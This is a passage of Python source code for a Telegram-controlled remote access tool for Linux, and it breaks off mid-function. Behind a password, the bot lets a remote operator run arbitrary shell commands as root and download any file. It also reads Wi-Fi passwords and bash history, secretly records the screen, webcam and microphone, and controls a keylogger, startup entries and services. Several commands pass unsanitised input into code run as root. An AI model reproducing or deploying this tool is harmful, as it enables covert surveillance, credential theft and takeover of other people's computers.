    elif mode == 'list':
        blocked_domain = []
        date_blocked_domain = []

        with open(PATH_BLACKLIST_WEBSITES, 'r') as blacklist_websites:
            for n in blacklist_websites.readlines():
                blocked_domain.append(n.split()[0])
                date_blocked_domain.append(' | '.join(n.split()[1:]))

        if not blocked_domain:
            return ''
        
        return tabulate(list(zip(date_blocked_domain, blocked_domain)), 
                        headers=[('DATE'), ('DOMAIN')], tablefmt='pipe')
    else:
        with open(PATH_BLACKLIST_WEBSITES, 'r') as blacklist_websites:
            for n in blacklist_websites.readlines():
                try:
                    unblock_domain(n.split()[0])
                except:
                    continue
        
        with open(PATH_BLACKLIST_WEBSITES, 'w') as blacklist_websites: ...


def get_apps():
    installer_packages = ''
    snap_apps = decode_shell_output('snap list'.split())
    flatpak_apps = decode_shell_output('sudo flatpak list'.split())

    for n in installed_packages.split('\n'):
        try:
            pattern = n.split()[-1]

            if pattern[0] == '[' and pattern[-1] == ']':
                installer_packages += f'{n}\n'
        except:
            continue

    return \
        '/' + '-' * 50 + f'INSTALLER-PACKAGES-{INSTALLER_PACKAGES}' + '-' * 50 + '\\' + '\n' + installer_packages.strip() + '\n' + \
        '/' + '-' * 50 + f'SNAP-APPS' + '-' * 50 + '\\' + '\n' + snap_apps.strip() + '\n' + \
        '/' + '-' * 50 + f'FLATPAK-APPS' + '-' * 50 + '\\' + '\n' + flatpak_apps.strip()


def get_task():


    def parse_task(text):
        nonlocal tasks

        for n in text.split('\n'):
            try:
                if n.strip()[0] != '#':
                    tasks += f'{n}\n'
            except:
                continue


    tasks = ''

    etc_crontab = decode_shell_output('sudo cat /etc/crontab'.split())
    crontab_l = decode_shell_output('sudo crontab -l'.split())  
    
    tasks += '/' + '-' * 50 + '/etc/crontab' + '-' * 50 + '\\' + '\n'
    parse_task(etc_crontab)
    tasks += '/' + '-' * 50 + 'crontab -l' + '-' * 50 + '\\' + '\n'
    parse_task(crontab_l)

    return tasks


def get_startup():
    

    def parse_startup(path):
        nonlocal path_startup

        for n in path:
            path_startup += f'{n}\n'


    path_startup = ''

    parse_startup(glob(f'/home/{USER}/.config/autostart/*'))
    parse_startup(glob('/etc/init.d/*'))
    parse_startup(glob('/etc/rc.local/*'))

    return path_startup


def get_path():
    paths = ''      

    for path_main in [n for n in glob(f'/home/{USER}/*')]:
        for path_sub in glob(f'{path_main}/*'):
            if not path_main in paths:
                paths += '/' + '-' * 50 + path_main + '-' * 50 + '\\' + '\n'

            paths += f'{path_sub}\n'  

    return paths


def get_ps():
    user = []
    pid = []
    cpu = []
    memory = []
    time = []
    command = []

    ps = decode_shell_output(f'sudo ps -eo user,pid,%cpu,%mem,time,comm'.split())

    if 'USER' in ps and 'COMMAND' in ps: 
        for n in ps.split('\n'):
            try:
                ps_data = n.split()

                user.append(ps_data[0])
                pid.append(ps_data[1])
                cpu.append(ps_data[2])
                memory.append(ps_data[3])
                time.append(ps_data[4])
                command.append(' '.join(ps_data[5:]))
            except:
                continue

        return tabulate(list(zip(user, pid, cpu, memory, time, command))[1:],
            headers=[('USER'), ('PID'), ('CPU'), ('MEMORY'), ('TIME'), ('COMMAND')], tablefmt='pipe')
    else:
        return


def playsound(path_sound):
    sp.Popen(['cvlc', '--play-and-exit', path_sound], stdout=sp.DEVNULL, stderr=sp.DEVNULL)


def play(second, mode):
    path_play = f'{PATH_TMP}/{generate_name_tmp()}'

    if mode == 'audio':
        path_play += '.mp3'

        audio = PyAudio()
        stream = audio.open(format=paInt16, channels=1, rate=44100,
                            input=True, frames_per_buffer=1024)
        frames = []

        for _ in range(44100 // 1024 * second): 
            frames.append(stream.read(1024, exception_on_overflow=False))

        stream.stop_stream()
        stream.close()
        audio.terminate()

        with open_audio(path_play, 'wb') as sound_mp3: 
            sound_mp3.setnchannels(1)
            sound_mp3.setsampwidth(audio.get_sample_size(paInt16))
            sound_mp3.setframerate(44100)
            sound_mp3.writeframesraw(b''.join(frames))
    elif mode == 'screen':
        path_play += '.mp4'
       
        video = opencv.VideoWriter(path_play, opencv.VideoWriter_fourcc(*'mp4v'), 10, (pygui.size()))
            
        for _ in range(second * 10):
            try: 
                video.write(opencv.cvtColor(screenshot_array(pygui.screenshot()), opencv.COLOR_BGR2RGB))
            except: 
                break

        video.release() 
    else:
        path_play += '.mp4'

        webcam = opencv.VideoCapture(0)

        if not webcam.isOpened(): 
            webcam = opencv.VideoCapture(1)

        if webcam.isOpened():
            webcam.set(opencv.CAP_PROP_FPS, 20)
            webcam.set(opencv.CAP_PROP_FRAME_WIDTH, 1280)
            webcam.set(opencv.CAP_PROP_FRAME_HEIGHT, 720)

            video = opencv.VideoWriter(path_play, opencv.VideoWriter_fourcc(*'mp4v'), 20, (1280, 720))
                
            for _ in range(second * 20): 
                video.write(webcam.read()[1])

            video.release()
            webcam.release()

    return path_play
    

def take_screenshot():
    path_screenshot = f'{PATH_TMP}/{generate_name_tmp()}.png'

    try:
        pygui.screenshot(path_screenshot)

        with open(path_screenshot, 'rb') as screenshot_png:
            screenshot_data = screenshot_png.read()

        del_file(path_screenshot)
        
        return screenshot_data
    except:
        return ''


def take_screenshot_webcam():
    path_screenshot_webcam = f'{PATH_TMP}/{generate_name_tmp()}.png'

    webcam = opencv.VideoCapture(0)

    if not webcam.isOpened(): 
        webcam = opencv.VideoCapture(1)

    if webcam.isOpened(): 
        opencv.imwrite(path_screenshot_webcam, webcam.read()[1])
        webcam.release()

        with open(path_screenshot_webcam, 'rb') as screenshot_webcam_png: 
            screenshot_webcam_data = screenshot_webcam_png.read()

        del_file(path_screenshot_webcam)

        return screenshot_webcam_data
    else:
        return ''
    

def bot(bot_client):


    def write_pid():
        with open(f'{PATH_SYS}/kernel.pid', 'w') as kernel_pid:
            kernel_pid.write(str(os.getpid()).strip())


    date_bot = get_date()
    os_bot = uname()

    session = f'Author: Vladislav Khudash\n\nNode: {os_bot.node}\nPlatform: {PLATFORM}\nKernel release: {os_bot.release}\nDate: {date_bot[0]} | {date_bot[-1]}'


    @bot_client.message_handler(content_types=['document'])
    def upload(file):
        try: 
            if os.path.exists(f'{PATH_USERS}/{file.from_user.id}'):
                with open(f'{PATH_TOOLS}/{file.document.file_name}', 'wb') as upload_file: 
                    upload_file.write(bot_client.download_file(
                        bot_client.get_file(file.document.file_id).file_path))
            else: 
                bot_client.send_message(file.chat.id, 'Enter password to connect to this session')
        except NameError: 
            bot_client.send_message(file.chat.id, 'Enter password to connect to this session')
        except BaseException as error: 
            bot_client.send_message(file.chat.id, 
                f'Why: An error occurred while processing this uploading this file ({file})\nType: {type(error).__name__}\nDescription: {error}')      


    @bot_client.message_handler()
    def executor(message):
        

        def send_command_result(text, file=''):
            if file:
                if text.strip():
                    bot_client.send_document(chat_id, text if type(text) is bytes else text.encode(), visible_file_name=file)
                else:
                    bot_client.send_message(chat_id, 'NOT FOUND') 
            else:
                bot_client.send_message(chat_id, text if text else 'NOT FOUND')        


        try:
            creator_folder([
                PATH, 
                PATH_SYS,
                PATH_SERVICES,
                PATH_USERS, 
                PATH_TOOLS,
                PATH_TMP
            ])

            write_pid()
            
            command = message.text.strip()
            chat_id = message.chat.id 
            user_id = message.from_user.id

            if not os.path.exists(f'{PATH_USERS}/{user_id}'):  
                if not os.path.exists(f'{PATH_USERS}/{user_id}') and command == PASSWORD:          
                    with open(f'{PATH_USERS}/{user_id}', 'w') as account_data_file: 
                        account_data_file.write(encrypt_string(f'User id: {user_id}\nUser name: @{message.from_user.username}\nConnection date: {date_bot[0]} | {date_bot[-1]}')) 
                    
                    bot_client.send_message(chat_id, session)
                else: 
                    bot_client.send_message(chat_id, 'Enter password to connect to this session')
            else: 
                try:
                    cd_path = search(r'^cd (\S?.+)', command).group(1).strip()
                    os.chdir(cd_path)       
                    
                    return
                except AttributeError: ...

                try:   
                    hide_path = search(r'^hide (\S?.+)', command).group(1).strip()
                    check_path(hide_path)
                    move(hide_path, '.' + hide_path) 

                    return
                except AttributeError: ...

                try: 
                    unhide_path = search(r'^unhide (\S?.+)', command).group(1).strip()
                    check_path(unhide_path)

                    if os.path.split(unhide_path)[-1][0] == '.':
                        move(unhide_path, unhide_path[1:])
                    else:
                        raise TypeError(f"File or folder is not hidden: '{unhide_path}'")   
                    
                    return
                except AttributeError: ...

                try:
                    mkdir_path = search(r'^mkdir (\S?.+)', command).group(1).strip()
                    creator_folder(mkdir_path)     

                    return
                except AttributeError: ...
                
                try:
                    mkfile_path = search(r'^mkfile (?P<path>\S?.+) -c (?P<content>\S?.+)', command).groupdict()

                    with open(mkfile_path['path'].strip(), 'w') as mkfile_file: 
                        mkfile_file.write(sub(r'(\\n)', '\n', sub(r'(\\t)', '\t', mkfile_path['content'].strip())))  

                    return
                except AttributeError: ...

                try:
                    rn_path = search(r'^rn (?P<path>\S?.+) -t (?P<new_name>\S?.+)', command).groupdict()
                    check_path(rn_path['path'].strip())
                    move(rn_path['path'].strip(), rn_path['new_name'].strip())

                    return
                except AttributeError: ...

                try:
                    rmdir_path = search(r'^rmdir (\S?.+)', command).group(1).strip()
                    delete_directory(rmdir_path, mode=1)      

                    return
                except AttributeError: ...

                try:
                    rm_path = search(r'^rm (\S?.+)', command).group(1).strip()
                
                    if not os.path.isfile(rm_path): 
                        raise TypeError(f"Path is not file: '{rm_path}'")
                            
                    del_file(rm_path)

                    return
                except AttributeError: ...

                try:
                    cp_path = search(r'^cp (?P<path_from>\S?.+) -t (?P<path_to>\S?.+)', command).groupdict()
                    check_path(cp_path['path_from'].strip())
                    copy(cp_path['path_from'].strip(), cp_path['path_to'].strip())
      
                    return
                except AttributeError: ...

                try:
                    mv_path = search(r'^mv (?P<path_from>\S?.+) -t (?P<path_to>\S?.+)', command).groupdict()
                    check_path(mv_path['path_from'].strip())
                    move(mv_path['path_from'].strip(), mv_path['path_to'].strip())

                    return
                except AttributeError: ...

                try:
                    download_path = search(r'^download (\S?.+)', command).group(1).strip()
                    check_path(download_path)
                    bot_client.send_document(
                        chat_id, 
                        decode_shell_output(['sudo', 'cat', download_path]).encode(), 
                        visible_file_name=os.path.split(download_path)[-1]
                    )

                    return
                except AttributeError: ...

                try:
                    encrypt_file = search(r'^encrypt (?P<path>\S?.+) -p (?P<password>\S?.+)', command).groupdict()
                    check_path(encrypt_file['path'].strip())
                    python_root(f'''
from pyAesCrypt import encryptFile
from subprocess import run, DEVNULL\n\n                                
encryptFile('{encrypt_file["path"].strip()}', '{encrypt_file["path"].strip()}.cw', '{encrypt_file["password"].strip()}')
run(['sudo', 'rm', '-f', '{encrypt_file["path"].strip()}'], stdout=DEVNULL, stderr=DEVNULL, input=False)
run(['sudo', 'mv', '{encrypt_file["path"].strip()}.cw', '{encrypt_file["path"].strip()}'], stdout=DEVNULL, stderr=DEVNULL, input=False)
'''.strip()
                    )

                    return
                except AttributeError: ...

                try:
                    decrypt_file = search(r'^decrypt (?P<path>\S?.+) -p (?P<password>\S?.+)', command).groupdict()
                    check_path(decrypt_file['path'].strip())
                    python_root(f'''
from pyAesCrypt import decryptFile 
from subprocess import run, DEVNULL\n\n                                
decryptFile('{decrypt_file["path"].strip()}', '{decrypt_file["path"].strip()}.cw', '{decrypt_file["password"].strip()}')
run(['sudo', 'rm', '-f', '{decrypt_file["path"].strip()}'], stdout=DEVNULL, stderr=DEVNULL, input=False)
run(['sudo', 'mv', '{decrypt_file["path"].strip()}.cw', '{decrypt_file["path"].strip()}'], stdout=DEVNULL, stderr=DEVNULL, input=False)
'''.strip()
                    )
                        
                    return
                except AttributeError: ...

                try:
                    network = search(r'^network (-s|-p|-c|-d)', command).group(1).strip()

                    if network == '-s':
                        send_command_result(get_wifi(), file='wifi.txt')
                    elif network == '-p':
                        send_command_result(get_wifi_password())
                    elif network == '-c':
                        sp.run('sudo nmcli networking on'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL)
                    else:
                        sp.run('sudo nmcli networking off'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL)
     
                    return
                except AttributeError: ...

                try:
                    kill_app = search(r'^kill (-p|-n) (\d+|\S?.+)', command).group(1, 2)

                    if kill_app[0].strip() == '-p':
                        sp.run(f'sudo kill -9 {kill_app[-1].strip()}'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL)
                    else:
                        sp.run(f'sudo pkill -9 {kill_app[-1].strip()}'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL)        
     
                    return
                except AttributeError: ... 

                try:
                    show_message = search(r'^show (?P<type>-p|-i|-w|-e) (?P<title>\S?.+) -t (?P<text>\S?.+)', command).groupdict()
                    
                    show_message_type = show_message['type'].strip()
                    show_message_title = show_message['title'].strip()
                    message_content = sub(r'(\\n)', '\n', sub(r'(\\t)', '\t', show_message['text'].strip()))

                    if show_message_type == '-p': 
                        sp.run(['notify-send', '-u', 'critical', '-a', show_message_title, message_content], 
                               stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)
                    elif show_message_type == '-i': 
                        showinfo(show_message_title, message_content)          
                    elif show_message_type == '-w': 
                        showwarning(show_message_title, message_content)      
                    else: 
                        showerror(show_message_title, message_content) 

                    return
                except AttributeError: ...  

                if 'module' in command:
                    try:
                        module = search(r'^module (?P<mode>-e|-d) (?P<name>all|agent|keylogger|app)', command).groupdict()
                        module_mode = module['mode'].strip()
                        module_name = module['name'].strip()

                        if module_name == 'all' or module_name == 'agent':
                            setup_module(
                                module_agent,
                                'agent',
                                PATH_MODULE_AGENT + '.flag',
                                send_command_result,
                                module_mode
                            )
                        elif module_name == 'all' or module_name == 'keylogger': 
                            setup_module(
                                module_keylogger,
                                'keylogger',
                                PATH_MODULE_KEYLOGGER + '.flag',
                                send_command_result,
                                module_mode
                            )
                        elif module_name == 'all' or module_name == 'app':
                            setup_module(
                                module_blocker_app,
                                'app',
                                PATH_MODULE_BLOCKER_APP + '.flag',
                                send_command_result,
                                module_mode
                            )
                            
                        return
                    except AttributeError: ...

                    try:
                        search(r'^module (-g)', command).group(1).strip()  
                        send_command_result(
                            tabulate([
                                status_module('agent', PATH_MODULE_AGENT + '.flag'),
                                status_module('keylogger', PATH_MODULE_KEYLOGGER + '.flag'),
                                status_module('app', PATH_MODULE_BLOCKER_APP + '.flag')
                            ], headers=[('MODULE'), ('STATE')], tablefmt='grid'),
                            file='modules.txt'
                        )

                        return
                    except AttributeError: ...
                elif 'accounts' in command:
                    try:
                        if search(r'^accounts (-g)', command).group(1).strip(): 
                            accounts = []

                            for account_file in glob(f'{PATH_USERS}/*'):
                                try: 
                                    with open(account_file, 'r') as account_data_file: 
                                        accounts.append(decrypt_string(account_data_file.read()))
                                except: 
                                    continue

                            bot_client.send_document(chat_id, 
                                tabulate([accounts], tablefmt='grid').encode(), visible_file_name='accounts.txt')
     
                        return
                    except AttributeError: ...

                    try: 
                        account_id = search(r'^accounts -d (\S?.+)', command).group(1).strip()                   
                        del_file(f'{PATH_USERS}/{account_id}')

                        if not os.path.exists(f'{PATH_USERS}/{account_id}'):
                            bot_client.send_message(chat_id,  f'This account has been deleted {account_id}') 
                        else:
                            bot_client.send_message(chat_id,  f'This account has not been deleted {account_id}') 
     
                        return
                    except AttributeError: ...
                elif 'site' in command: 
                    try:
                        site_url_open = search(r'^site -s (\S?.+)', command).group(1).strip()
                        open_website(site_url_open)

                        return
                    except AttributeError: ...
                    
                    try:
                        site_block = search(r'^site (-b|-d) (\S?.+)', command).group(1, 2)

                        if site_block[0].strip() == '-b':
                            blocker_website(site_block[1].strip(), 'block') 
                        else: 
                            blocker_website(site_block[1].strip(), 'unblock')
        
                        return
                    except AttributeError: ...

                    try:
                        sites_blocked = search(r'^site (-l|-r)', command).group(1).strip()
                        
                        if sites_blocked == '-l':
                            send_command_result(blocker_website('', 'list'), file='blocked_websites.txt')
                        else: 
                            blocker_website('', 'restart')

                        return
                    except AttributeError: ...
                elif 'buffer' in command:
                    try:
                        if search(r'^buffer (-g)', command).group(1).strip():
                            buffer_data = buffer_get()

                            if buffer_data.strip():
                                bot_client.send_document(chat_id, buffer_data.encode(), 
                                                         visible_file_name='buffer.txt') 
                            else: 
                                bot_client.send_message(chat_id, 'Buffer is empty')
  
                        return
                    except AttributeError: ... 

                    try:
                        copy_data_for_buffer = search(r'^buffer -c (\S?.+)', command).group(1).strip()
                        buffer_copy(copy_data_for_buffer)

                        return
                    except AttributeError: ...

                    try:
                        if search(r'^buffer (-r)', command).group(1).strip():
                            buffer_copy('')
     
                        return
                    except AttributeError: ...
                elif 'app' in command:
                    try: 
                        search(r'^app (-g)', command).group(1).strip() 
                        send_command_result(get_apps(), file='apps.txt')

                        return
                    except AttributeError: ...

                    try:
                        try:
                            app_launch = search(r'^app -s (?P<user>-u|-r) (?P<path>\S?.+) --args (?P<args>\S?.+)', command).groupdict()
                            is_args = True
                        except: 
                            app_launch = search(r'^app -s (?P<user>-u|-r) (?P<path>\S?.+)', command).groupdict()
                            is_args = False
                        
                        startfile(
                            app_launch['path'].strip(), 
                            args=app_launch['args'].split() if is_args else [],
                            root=True if app_launch['user'].strip() == '-r' else False
                        )

                        return
                    except AttributeError: ...

                    try:
                        app_url = search(r'^app -u (?P<url>\S?.+) -n (?P<name>\S?.+)', command).groupdict()
                        get_http(app_url['url'].strip(), file=f'{PATH_TOOLS}/{app_url["name"].strip()}')

                        return
                    except AttributeError: ...

                    try:
                        try:
                            app_start = search(r'^app (?P<user>-u|-r) -a (?P<name>\S?.+) -p (?P<path>\S?.+) --args (?P<args>\S?.+)', command).groupdict()
                            is_args = True
                        except:
                            app_start = search(r'^app (?P<user>-u|-r) -a (?P<name>\S?.+) -p (?P<path>\S?.+)', command).groupdict()
                            is_args = False

                        if is_args:
                            args = app_start['args'].strip()
                        else:
                            args = 'NULL'

                        add_startup(
                            app_start['name'].strip().lower(),
                            'root' if app_start['user'].strip() == '-r' else USER,
                            app_start['path'].strip(),
                            args
                        )

                        return
                    except AttributeError: ...

                    try:
                        app_startup = search(r'^app -a (\S?.+)', command).group(1).strip()
                        delete_startup(app_startup.lower())
                        
                        return
                    except AttributeError: ...

                    try:
                        startup_mode = search(r'^app (-l -e|-r -e)', command).group(1).strip()
                        if startup_mode == '-l -e':
                            send_command_result(get_startup_data(), file='startup.txt')
                        else:
                            with open(PATH_STARTUP, 'w') as file_startup: ...

                        return
                    except AttributeError: ...

                    try:
                        app_service = search(r'^app -t (?P<name>\S?.+) -p (?P<path>\S?.+) -d (?P<description>\S?.+)', command).groupdict()
                        create_service(app_service['name'].strip(), app_service['path'].strip(), app_service['description'].strip())
                        
                        return
                    except AttributeError: ...

                    try:
                        app_service = search(r'^app -t (-e|-d) (\S?.+)', command).group(1, 2)

                        if app_service[0].strip() == '-e':
                            start_service(app_service[-1].strip())
                        else:
                            stop_service(app_service[-1].strip())

                        return
                    except AttributeError: ...

                    try:
                        app_service = search(r'^app -t (\S?.+)', command).group(1).strip()
                        delete_service(app_service)

                        return
                    except AttributeError: ...

                    try:
                        app_block = search(r'^app (-b|-d) (\S?.+)', command).group(1, 2)
                        module_blocker_app(app_block[-1].strip(), 'block' if app_block[0].strip() == '-b' else 'unblock') 
                    except AttributeError: ...

                    try:
                        app_block = search(r'^app (-l|-r) -b', command).group(1).strip()
                    except AttributeError: ...

                    try:
                        app_block = search(r'^app (-l|-r) -b', command).group(1).strip()

                        if app_block == '-l':
                            send_command_result(module_blocker_app('', 'list'), file='blocked_apps.txt')
                        else:
                            module_blocker_app('', 'reset')
                            
                        return
                    except AttributeError: ...
                elif 'time' in command:
                    try:
                        if search(r'^time (-g)', command).group(1).strip():
                            bot_client.send_message(chat_id, 
                                decode_shell_output('date +"%T"'.split()).replace('"', '').strip())     
                        
                        return
                    except AttributeError: ...

                    try:
                        new_time = search(r'^time -c (\S?.+)', command).group(1).strip()
                        sp.run(['sudo', 'date', '+%T', '-s', new_time], stdout=sp.DEVNULL, stderr=sp.DEVNULL)       
                        
                        return
                    except AttributeError: ...
                elif 'date' in command:
                    try:
                        if search(r'^date (-g)', command).group(1).strip():
                            bot_client.send_message(chat_id, 
                                decode_shell_output('date +"%F"'.split()).replace('"', '').strip())       
                    
                        return
                    except AttributeError: ...

                    try:
                        new_date = search(r'^date -c (\S?.+)', command).group(1).strip()
                        sp.run(['sudo', 'date', '+%F', '-s', new_date], stdout=sp.DEVNULL, stderr=sp.DEVNULL)  
                                                 
                        return
                    except AttributeError: ...
                elif 'cmd' in command:
                    try:
                        cmd_command = search(r'^cmd (-e|-g) (\S?.+)', command).group(1, 2)

                        with open(f'{PATH_TMP}/shell.sh', 'w') as shell_sh:
                            shell_sh.write(f'#!/bin/bash\n{cmd_command[-1].strip()}')
                        os.chmod(f'{PATH_TMP}/shell.sh', 0o755)
                            
                        if cmd_command[0].strip() == '-e': 
                            sp.run(f'{PATH_TMP}/shell.sh', stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)
                        else:
                            result_cmd_command = sp.run(f'{PATH_TMP}/shell.sh', stdout=sp.PIPE, stderr=sp.PIPE, input=False)

                            stdout = decode_shell_output(result_cmd_command.stdout, flag=False)
                            stderr = decode_shell_output(result_cmd_command.stderr, flag=False) 

                            if not stdout and not stderr:
                                stdout = f'"{cmd_command[-1].strip()}" command completed'

                            if not stderr and not stdout: 
                                stderr = f'"{cmd_command[-1].strip()}" command completed' 

                            send_command_result(stdout if stdout else stderr, file='cmd.txt') 

                        del_file(f'{PATH_TMP}/shell.sh')

                        return
                    except AttributeError: ... 

                    try:
                        cmd_history = search(r'^cmd -h (-g|-r)', command).group(1).strip()

                        if cmd_history == '-g':
                            send_command_result(decode_shell_output(f'sudo cat /home/{USER}/.bash_history'.split()).strip(), file='cmd_history.txt')
                        else:
                            del_file(f'/home/{USER}/.bash_history')

                        return
                    except AttributeError: ...
                elif 'play' in command:
                    try: 
                        play_audio = search(r'^play -a (\S?.+)', command).group(1).strip()

                        if os.path.isfile(play_audio):
                            if (file_extension := play_audio.split('.')[-1]) in [
                                'mp2', 
                                'mp3', 
                                'ogg', 
                                'wav', 
                                'wma', 
                                'aac'
                            ]: 
                                Thread(target=playsound, args=(play_audio,), name='playsound').start()
                            else: 
                                raise TypeError(f'Extension is not supported .{file_extension}')
                        else: 
                            raise FileNotFoundError(f"[Errno 2] No such file: '{play_audio}'")
      
                        return
                    except AttributeError: ...

                    try:
                        play_seconds = search(r'^play (-a|-v|-w) -s (\d+)', command).group(1, 2)

                        if play_seconds[0].strip() == '-a': 
                            play_name = 'sound.mp3'
                            play_path = play(abs(int(play_seconds[1].strip())), 'audio')    
                        elif play_seconds[0].strip() == '-v':
                            play_name = 'screen.mp4'
                            play_path = play(abs(int(play_seconds[1].strip())), 'screen') 
                        else:
                            play_name = 'webcam.mp4'
                            play_path = play(abs(int(play_seconds[1].strip())), 'webcam')  

                        try:
                            with open(play_path, 'rb') as play_file:
                                play_file_data = play_file.read()
                        except:
                            send_command_result('NOT FOUND')
                        else:
                            send_command_result(play_file_data, file=play_name)
                            del_file(play_path)

                        return
                    except AttributeError: ...
                elif 'mouse' in command:
                    try: 
                        if search(r'^mouse (-g)', command).group(1).strip():
                            mouse_position = pygui.position()
                            bot_client.send_message(chat_id, 
                                f'Current mouse cursor position: {mouse_position.x}x{mouse_position.y}')

                        return
                    except AttributeError: ...

                    try:
                        mouse_movement = search(r'^mouse -x (?P<x>\d+) -y (?P<y>\d+) -i (?P<interval>\S+)', command).groupdict() 
                        python_root(f"""from pyautogui import moveTo
moveTo({abs(int(mouse_movement['x'].strip()))}, {abs(int(mouse_movement['y'].strip()))}, duration={abs(float(mouse_movement['interval'].strip()))})""")

                        return
                    except AttributeError: ...                 

                    try:
                        mouse_clicks = search(r'^mouse -c (?P<clicks>\d+) -i (?P<interval>\S+) (?P<button>-l|-r)', command).groupdict()
                        
                        if mouse_clicks['button'].strip() == '-l':
                            python_root(f"""from pyautogui import click
click(clicks={abs(int(mouse_clicks['clicks'].strip()))}, duration={abs(float(mouse_clicks['interval'].strip()))})""")
                        else: 
                            python_root(f"""from pyautogui import click
click(clicks={abs(int(mouse_clicks['clicks'].strip()))}, duration={abs(float(mouse_clicks['interval'].strip()))}, button='right')""")
                        
                        return
                    except AttributeError: ...

                    try:
                        mouse_scroll = search(r'^mouse -s (\d+|-\d+)', command).group(1).strip()
                        python_root(f'from pyautogui import scroll\nscroll({int(mouse_scroll)})')

                        return
                    except AttributeError: ...
                elif 'keyboard' in command:
                    try:
                        keyboard_write = search(r'^keyboard -t (?P<text>\S?.+) -i (?P<interval>\S+)', command).groupdict()
                        python_root(f"""from pyautogui import typewrite
typewrite('{keyboard_write['text'].strip()}', interval={abs(float(keyboard_write['interval'].strip()))})""")

                        return
                    except AttributeError: ...

                    try:
                        keyboard_key = search(r'^keyboard -k (?P<key>\S?.+) -p (?P<presses>\d+) -i (?P<interval>\S+)', command).groupdict()
                        python_root(f"""from pyautogui import press
press('{keyboard_key['key'].strip()}', presses={abs(int(keyboard_key['presses'].strip()))}, interval={abs(float(keyboard_key['interval'].strip()))})""")

                        return
                    except AttributeError: ...

                    try:
                        keyboard_hold_key = search(r'^keyboard -d (?P<key>\S?.+) -s (?P<second>\S+)', command).groupdict()
                        python_root(f"""from keyboard import press, release\nfrom time import sleep
press('{keyboard_hold_key['key'].strip()}'), 
sleep({abs(float(keyboard_hold_key['second'].strip()))})
release('{keyboard_hold_key['key'].strip()}')""")
                        
                        return
                    except AttributeError: ...

                    try:
                        keyboard_remap_key = search(r'^keyboard -c (?P<key_type>-k|-h) (?P<key_from>\S?.+) -t (?P<key_to>\S?.+)', command).groupdict()
                        
                        if keyboard_remap_key['key_type'].strip() == '-k' :
                            python_root(f"""from keyboard import remap_key
remap_key('{keyboard_remap_key['key_from'].strip()}', '{keyboard_remap_key['key_to'].strip()}')""")
                        else: 
                            python_root(f"""from keyboard import remap_hotkey
remap_hotkey('{keyboard_remap_key['key_from'].strip()}', '{keyboard_remap_key['key_to'].strip()}')""")

                        return
                    except AttributeError: ...

                    try:
                        keyboard_hotkey_or_block_key = search(r'^keyboard (-h|-b) (\S?.+)', command).group(1, 2)
                        
                        if keyboard_hotkey_or_block_key[0].strip() == '-h':
                            python_root(f"from pyautogui import hotkey\nhotkey('{keyboard_hotkey_or_block_key[1].split()}')")
                        else:
                            python_root(f"from keyboard import block_key\nblock_key('{keyboard_hotkey_or_block_key[1].strip()}')")

                        return
                    except AttributeError: ...

                    try:
                        if search(r'^keyboard (-r)', command).group(1).strip():
                            python_root('from keyboard import unhook_all\nunhook_all()')
 
                        return
                    except AttributeError: ...

                if command == 'author':
                    send_command_result(
'''
Hello, welcome to my project
This project was created for remote access to a computer
There are two versions of this project, made through socket and also through a telegram bot
My name is Vladislav Khudash, at the time of the creation of this project I was 16 years old
I love science and sports, let\'s make the world a better place
You can contact me in github https://github.com/cppandpython
'''.strip()
                    )
                elif command == 'help':
                    send_command_result(
'''
Core Commands
=============

    Command                   Description
    -------                   -----------   
    author                    Information about creator of this project                                         
    help                      Help menu
    libs_error                Python libraries errors
    module                    Module control
    session                   About this session
    accounts                  Control accounts connected to this computer session 
    getuid                    Get the user on whose behalf the bot is running
    getpid                    Get the current process identifier
    exit                      Log out of this computer session
                                                              

File System Commands 
====================

    Command                   Description
    -------                   -----------                                                                                                                                                        
    pwd                       Display working directory
    cd                        Change directory
    ls                        List files in working directory  
    hide                      Hide folder or file
    unhide                    Unhide folder or file                               
    mkdir                     Create folder
    mkfile                    Create file
    rn                        Rename folder or file
    rmdir                     Delete folder            
    rm                        Delete file  
    cp                        Copy folder or file to destination
    mv                        Move folder or file to destination
    download                  Download file
    upload                    Upload file
    encrypt                   Encrypt file
    decrypt                   Decrypt file

                                                              
Networking Commands
===================

    Command                   Description
    -------                   -----------         
    network                   Network control
    ipconfig                  Get network interfaces
    route                     Get routing table
    arp                       Get host ARP cache                                                                                     
    netstat                   Get network connections
    site                      Website control  
                                                                                               
                                               
System Commands                                                    
===============

    Command                   Description
    -------                   -----------                                                                                                           
    systeminfo                Get information about computer
    buffer                    Get data from buffer
    services                  Get information about services
    tasks                     Get information about tasks
    startup                   Get information about startup
    paths                     Get paths to all folders on computer
    app                       Application control   
    ps                        List running processes
    kill                      Terminate process
    time                      Get current time or change current time
    date                      Get current date or change current date
    cmd                       Execute command in cmd and working with cmd history
    reboot                    Computer reboot
    shutdown                  Computer shutdown

                                                                                                            
User Interface Commands                                                  
=======================

    Command                   Description
    -------                   -----------
    screenshot                Take screenshot of desktop
    screenshot_webcam         Take screenshot using webcam 
    play                      Record audio or video from screen or video from webcam
    mouse                     Mouse control 
    keyboard                  Keyboard control                                                                                                                                         
    keylogger                 Control collected keylogger data
    show                      Display message
'''.strip(), file='help.txt'
                    )
                elif command == 'libs_error':
                    if libs_error:
                        send_command_result(libs_error, file='libs_error.txt')
                    else:
                        send_command_result('All Python modules work')
                elif command == 'module':
                    send_command_result(
'''
Agent module  -  Control the integrity of this program and also blocks malicious actions for this program\n
Keylogger module  -  Control keylogger\n
App module  -  Control application blocker\n
module -e (all, agent, keylogger, app)  -  Enable module\n
module -d (all, agent, keylogger, app)  -  Disable module\n
module -g  -  Get modules status
'''.strip()
                    )
                elif command == 'session':
                    send_command_result(session)
                elif command == 'accounts': 
                    send_command_result(
'''
accounts -g  -  Get accounts connected to this computer session\n
accounts -d host  -  Delete account connected to this computer session
'''.strip()
                    )
                elif command == 'getuid': 
                    send_command_result(f'Current user: {USER}')
                elif command == 'getpid': 
                    send_command_result(f'Current pid: {os.getpid()}')
                elif command == 'exit': 
                    try: 
                        del_file(f'{PATH_USERS}/{user_id}')
                    except: 
                        bot_client.send_message(chat_id, 'Failed to leave this session')
                    else: 
                        if not os.path.exists(rf'{PATH}\config\{user_id}'):
                            bot_client.send_message(chat_id, 'Successfully left this session')
                        else:
